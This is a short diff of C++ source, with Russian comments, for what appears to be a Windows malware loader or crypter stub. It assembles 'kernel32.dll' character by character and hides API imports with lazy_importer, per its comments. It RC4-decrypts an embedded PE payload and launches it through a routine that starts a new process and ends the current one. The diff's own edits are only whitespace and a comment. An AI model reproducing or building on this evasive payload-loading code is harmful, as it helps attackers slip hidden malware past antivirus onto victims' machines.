@@ -28,7 +28,6 @@ static void shellcode_start(PVOID lpFile, PVOID payload, DWORD szFile, DWORD siz
 			printf("+++ start:%d \n",ret);
 			STARTUPINFO si;
 			PROCESS_INFORMATION pi;
-
 			// Создадим другой процесс, а этот благополучно завершим.
 			memset(&si, 0, sizeof(STARTUPINFO));
 			si.cb = sizeof(STARTUPINFO);
@@ -93,7 +92,9 @@ int main()
 	kernel32[10] = 'l';
 	kernel32[11] = 'l';
 	kernel32[12] = '\0';
-    base = reinterpret_cast<std::uintptr_t>(LI_FIND(LoadLibraryA)(kernel32));
+	
+	//Для скрытия Virtualalloc используется lazy_importer.hpp
+        base = reinterpret_cast<std::uintptr_t>(LI_FIND(LoadLibraryA)(kernel32));
 
 #ifndef WIN64
 	uint8_t key_for_crypt = 116;
@@ -113,7 +114,6 @@ int main()
 	key_to_dec[3] = key_for_crypt + 4;
 
 	//Тут будет расшифровка кода
-
 	decRC4(key_to_dec, 4, loadpe, sizeof(loadpe)-1);
 
 	shellcode_start(loadpe, data_protect, sizeof(loadpe), sizeof(data_protect));
